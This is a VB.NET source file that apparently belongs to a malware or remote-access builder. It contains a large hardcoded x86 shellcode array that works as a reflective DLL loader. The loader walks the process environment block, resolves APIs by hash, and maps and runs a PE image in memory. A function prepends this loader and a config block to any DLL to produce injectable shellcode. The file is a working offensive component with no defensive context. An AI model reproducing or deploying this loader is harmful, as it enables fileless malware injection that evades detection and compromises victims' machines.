
Public Class clsDllToShellcode
    Private mainShellcode() As Byte = {&HE9, &H46, &H4, &H0, &H0, &H55, &H8B, &HEC, &H83, &HEC, &H18, &H53, &H56, &H8B, &H71, &H3C, &H57, &H89, &H55, &HF4, &H8B, &H44, &HE, &H78, &H85, &HC0, &H74, &H6D, &H83, &H7C, &HE, &H7C, &H0, &H74, &H66, &H8B, &H5C, &H8, &H18, &H89, &H5D, &HF8, &H85, &HDB, &H74, &H5B, &H8B, &H54, &H8, &H1C, &H8B, &H74, &H8, &H20, &H3, &HD1, &H8B, &H44, &H8, &H24, &H3, &HF1, &H89, &H55, &HE8,
                                    &H3, &HC1, &H33, &HD2, &H89, &H75, &HF0, &H89, &H45, &HEC, &H85, &HDB, &H74, &H3A, &H8B, &H3C, &H96, &H33, &HF6, &H3, &HF9, &H89, &H7D, &HFC, &H8A, &H7, &H84, &HC0, &H74, &H17, &H8B, &HDF, &H69, &HF6, &H83, &H0, &H0, &H0, &HF, &HBE, &HC0, &H3, &HF0, &H43, &H8A, &H3, &H84, &HC0, &H75, &HEE, &H8B, &H5D, &HF8, &H81, &HE6, &HFF, &HFF, &HFF, &H7F, &H3B, &H75, &HF4, &H74, &H11,
                                    &H8B, &H75, &HF0, &H42, &H3B, &HD3, &H72, &HC6, &H33, &HC0, &H5F, &H5E, &H5B, &H8B, &HE5, &H5D, &HC3, &H83, &H7D, &H8, &H0, &H75, &H11, &H8B, &H45, &HEC, &HF, &HB7, &H4, &H50, &H8B, &H55, &HE8, &H8B, &H4, &H82, &H3, &HC1, &HEB, &HE2, &H57, &H51, &HFF, &H55, &H8, &HEB, &HDB, &H55, &H8B, &HEC, &H51, &H83, &H65, &HFC, &H0, &HE8, &H0, &H0, &H0, &H0, &H58, &H2D, &HBD, &H10, &H2F,
                                    &H1, &H89, &H45, &HFC, &H8B, &H45, &HFC, &H8B, &HE5, &H5D, &HC3, &H55, &H8B, &HEC, &H51, &H51, &H64, &HA1, &H30, &H0, &H0, &H0, &HBA, &H54, &HB8, &HB9, &H1A, &H56, &H57, &H8B, &HF9, &H8B, &H40, &HC, &H6A, &H0, &H8B, &H40, &H14, &H8B, &H0, &H8B, &H0, &H8B, &H70, &H10, &H8B, &HCE, &HE8, &HE, &HFF, &HFF, &HFF, &H50, &HBA, &H78, &H1F, &H20, &H7F, &H89, &H7, &H8B, &HCE, &HE8,
                                    &HFF, &HFE, &HFF, &HFF, &HFF, &H37, &HBA, &H62, &H34, &H89, &H5E, &H89, &H47, &H4, &H8B, &HCE, &HE8, &HEE, &HFE, &HFF, &HFF, &HFF, &H37, &HBA, &H73, &H80, &H48, &H6, &H89, &H47, &H8, &H8B, &HCE, &HE8, &HDD, &HFE, &HFF, &HFF, &HFF, &H37, &HBA, &HA5, &HF2, &H5C, &H70, &H89, &H47, &HC, &H8B, &HCE, &HE8, &HCC, &HFE, &HFF, &HFF, &H83, &HC4, &H14, &H89, &H47, &H10, &H8D, &H45, &HF8,
                                    &HC7, &H45, &HF8, &H6E, &H74, &H64, &H6C, &H66, &HC7, &H45, &HFC, &H6C, &H0, &H50, &HFF, &H57, &H4, &HFF, &H37, &H8B, &HF0, &HBA, &HCB, &H79, &HB5, &HD, &H8B, &HCE, &HE8, &HA2, &HFE, &HFF, &HFF, &HFF, &H37, &HBA, &HC0, &HE9, &H18, &H15, &H89, &H47, &H14, &H8B, &HCE, &HE8, &H91, &HFE, &HFF, &HFF, &H59, &H59, &H89, &H47, &H18, &H5F, &H5E, &H8B, &HE5, &H5D, &HC3, &H55, &H8B, &HEC,
                                    &H83, &HEC, &H18, &H8B, &HC2, &H89, &H4D, &HFC, &H89, &H45, &HF4, &H53, &H56, &H85, &HC0, &H75, &H7, &H33, &HC0, &HE9, &H92, &H2, &H0, &H0, &HBA, &H4D, &H5A, &H0, &H0, &H66, &H39, &H10, &H75, &HEF, &H57, &H8B, &H78, &H3C, &H3, &HF8, &H81, &H3F, &H50, &H45, &H0, &H0, &HF, &H85, &H73, &H2, &H0, &H0, &HB8, &H4C, &H1, &H0, &H0, &H66, &H39, &H47, &H4, &HF, &H85, &H64, &H2, &H0,
                                    &H0, &H83, &HC0, &HBF, &H66, &H39, &H47, &H18, &HF, &H85, &H57, &H2, &H0, &H0, &H6A, &H40, &H68, &H0, &H10, &H0, &H0, &HFF, &H77, &H50, &H33, &HDB, &H53, &HFF, &H51, &H8, &H8B, &HF0, &H85, &HF6, &HF, &H84, &H3D, &H2, &H0, &H0, &HFF, &H77, &H54, &H8B, &H45, &HFC, &HFF, &H75, &HF4, &H56, &HFF, &H50, &H18, &H8B, &H7E, &H3C, &H33, &HC0, &H3, &HFE, &H89, &H5D, &HF0, &H89, &H7D, &HEC,
                                    &H66, &H3B, &H47, &H6, &H73, &H58, &H8B, &H5D, &HF4, &H8D, &H87, &H8, &H1, &H0, &H0, &H89, &H45, &HF8, &H8B, &H48, &HFC, &H85, &HC9, &H74, &H2B, &H3, &HCE, &H83, &H38, &H0, &H74, &H11, &HFF, &H30, &H8B, &H40, &H4, &H3, &HC3, &H50, &H8B, &H45, &HFC, &H51, &HFF, &H50, &H18, &HEB, &H10, &H83, &H7F, &H38, &H0, &H76, &HD, &HFF, &H77, &H38, &H8B, &H45, &HFC, &H51, &HFF, &H50, &H14,
                                    &H8B, &H45, &HF8, &H8B, &H4D, &HF0, &H83, &HC0, &H28, &H89, &H45, &HF8, &H41, &HF, &HB7, &H47, &H6, &H3B, &HC8, &H89, &H4D, &HF0, &H8B, &H45, &HF8, &H7C, &HB6, &H33, &HDB, &H8B, &H87, &HA0, &H0, &H0, &H0, &H85, &HC0, &H74, &H60, &H39, &H9F, &HA4, &H0, &H0, &H0, &H74, &H58, &H8D, &HC, &H30, &HEB, &H45, &H8D, &H42, &HF8, &H89, &H5D, &HF4, &HD1, &HE8, &H89, &H45, &HF8, &H85, &HC0,
                                    &H7E, &H31, &HF, &HB7, &H54, &H59, &H8, &H8B, &HC2, &HC7, &H45, &HF4, &H0, &H30, &H0, &H0, &H25, &H0, &HF0, &H0, &H0, &H66, &H3B, &H45, &HF4, &H75, &H10, &H81, &HE2, &HFF, &HF, &H0, &H0, &H8B, &HC6, &H3, &H11, &H2B, &H47, &H34, &H1, &H4, &H32, &H43, &H3B, &H5D, &HF8, &H7C, &HD1, &H33, &HDB, &H8B, &H45, &HF0, &H3, &H8, &H8D, &H41, &H4, &H8B, &H10, &H89, &H45, &HF0, &H8B, &H1, &H3,
                                    &HC2, &H75, &HAD, &H8B, &H87, &H80, &H0, &H0, &H0, &H85, &HC0, &H74, &H7F, &H39, &H9F, &H84, &H0, &H0, &H0, &H74, &H77, &H3, &HC6, &HEB, &H69, &H3, &HC6, &H50, &H8B, &H45, &HFC, &HFF, &H50, &H4, &H89, &H45, &HE8, &H85, &HC0, &HF, &H84, &H22, &H1, &H0, &H0, &H8B, &H45, &HF8, &H8B, &H8, &H85, &HC9, &H75, &H3, &H8B, &H48, &H10, &H8B, &H50, &H10, &H3, &HCE, &H89, &H4D, &HF0, &H3,
                                    &HD6, &H89, &H55, &HF4, &H8B, &H9, &H85, &HC9, &H74, &H33, &H8B, &H5D, &HFC, &H8B, &HFA, &H79, &H5, &HF, &HB7, &HC1, &HEB, &H5, &H8D, &H46, &H2, &H3, &HC1, &H50, &HFF, &H75, &HE8, &HFF, &H13, &H89, &H7, &H83, &HC7, &H4, &H8B, &H45, &HF0, &H83, &HC0, &H4, &H89, &H45, &HF0, &H8B, &H8, &H85, &HC9, &H75, &HDA, &H8B, &H7D, &HEC, &H33, &HDB, &H8B, &H45, &HF8, &H83, &HC0, &H14, &H89,
                                    &H45, &HF8, &H8B, &H40, &HC, &H85, &HC0, &H75, &H8D, &H8B, &H8F, &HC0, &H0, &H0, &H0, &H85, &HC9, &H74, &H3F, &H8B, &H4C, &H31, &HC, &H33, &HD2, &H6A, &H3, &H58, &H2B, &HC1, &H89, &H4D, &HF0, &HC1, &HE8, &H2, &H85, &HC9, &H89, &H5D, &HF4, &HF, &H45, &HC2, &H89, &H45, &HE8, &H85, &HC0, &H74, &H1F, &H8B, &HF8, &H53, &H6A, &H1, &H56, &HFF, &H11, &H8B, &H4D, &HF0, &H8B, &H45, &HF4,
                                    &H83, &HC1, &H4, &H40, &H89, &H4D, &HF0, &H89, &H45, &HF4, &H3B, &HC7, &H75, &HE6, &H8B, &H7D, &HEC, &H8B, &H47, &H28, &H3, &HC6, &H74, &H8, &HFF, &H75, &H8, &H6A, &H1, &H56, &HFF, &HD0, &H83, &H7D, &HC, &H0, &HF, &H84, &H8D, &H0, &H0, &H0, &H8B, &H45, &H10, &H85, &HC0, &HF, &H84, &H82, &H0, &H0, &H0, &H89, &H18, &H8B, &H47, &H78, &H85, &HC0, &H74, &H79, &H39, &H5F, &H7C, &H74,
                                    &H74, &H39, &H5C, &H30, &H18, &H74, &H6E, &H8B, &H4C, &H30, &H1C, &H8B, &H54, &H30, &H20, &H3, &HCE, &H89, &H4D, &HF4, &H3, &HD6, &H8B, &H4C, &H30, &H24, &H3, &HCE, &H89, &H55, &HEC, &H89, &H4D, &HF0, &H39, &H5C, &H30, &H14, &H76, &H4D, &H8B, &HF8, &H8B, &H4, &H9A, &HFF, &H75, &HC, &H3, &HC6, &H50, &H8B, &H45, &HFC, &HFF, &H50, &H10, &H85, &HC0, &H74, &H24, &H8B, &H55, &HEC, &H43,
                                    &H3B, &H5C, &H37, &H14, &H72, &HE3, &HEB, &H2C, &H8B, &H45, &HFC, &H68, &H0, &H40, &H0, &H0, &HFF, &H77, &H50, &H56, &HFF, &H50, &HC, &H33, &HC0, &H5F, &H5E, &H5B, &H8B, &HE5, &H5D, &HC3, &H8B, &H45, &HF0, &H8B, &H4D, &HF4, &HF, &HB7, &H4, &H58, &H8B, &H4, &H81, &H8B, &H4D, &H10, &H3, &HC6, &H89, &H1, &H33, &HC0, &H40, &HEB, &HE0, &H55, &H8B, &HEC, &H83, &HEC, &H24, &H53, &H56,
                                    &H57, &H8D, &H4D, &HDC, &HE8, &H71, &HFC, &HFF, &HFF, &HE8, &H4F, &HFC, &HFF, &HFF, &H83, &H65, &HFC, &H0, &H8B, &HF0, &H81, &HC6, &HFE, &H14, &H2F, &H1, &H33, &HDB, &H8B, &H7E, &HD, &H8B, &H46, &H1, &H3, &HFE, &H85, &HC0, &H74, &H3A, &H6A, &H4, &H68, &H0, &H10, &H0, &H0, &HFF, &H76, &H5, &H3, &HC6, &H53, &H89, &H45, &HF8, &HFF, &H55, &HE4, &H8B, &HD8, &H85, &HDB, &H75, &H4, &H33,
                                    &HC0, &HEB, &H5F, &HFF, &H76, &H5, &H53, &HFF, &H76, &H9, &H57, &HFF, &H55, &HF8, &H83, &HC4, &H10, &H83, &HF8, &HFF, &H74, &H20, &H3B, &H46, &H5, &H75, &H1B, &H8B, &HFB, &H33, &HDB, &H43, &H80, &H3E, &H0, &H8D, &H45, &HFC, &H50, &H8B, &HD7, &H8D, &H4D, &HDC, &H8D, &H46, &H11, &H75, &H13, &H6A, &H0, &H50, &HEB, &H11, &H68, &H0, &H40, &H0, &H0, &HFF, &H76, &H5, &H53, &HFF, &H55,
                                    &HE8, &HEB, &HBB, &H50, &H6A, &H0, &HE8, &H9E, &HFC, &HFF, &HFF, &H83, &HC4, &HC, &H85, &HDB, &H74, &HC, &H68, &H0, &H40, &H0, &H0, &HFF, &H76, &H5, &H57, &HFF, &H55, &HE8, &H8B, &H45, &HFC, &H5F, &H5E, &H5B, &H8B, &HE5, &H5D, &HC3}

    Public Function DllToShellcode(ByVal dllStub As Byte()) As Byte()
        Dim config As Byte() = Nothing
        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
        BinWritter.BufferAddByte(config, 0)
        BinWritter.BufferAddDword(config, 0)
        BinWritter.BufferAddDword(config, dllStub.Length)
        BinWritter.BufferAddDword(config, dllStub.Length)
        BinWritter.BufferAddDword(config, 117)
        BinWritter.BufferMerge(config, System.Text.Encoding.UTF8.GetBytes("Credit goes to: Killeven".PadRight(100, vbNullChar)))
        Dim shellcode As Byte() = mainShellcode
        BinWritter.BufferMerge(shellcode, config)
        BinWritter.BufferMerge(shellcode, dllStub)
        Return shellcode
    End Function
End Class
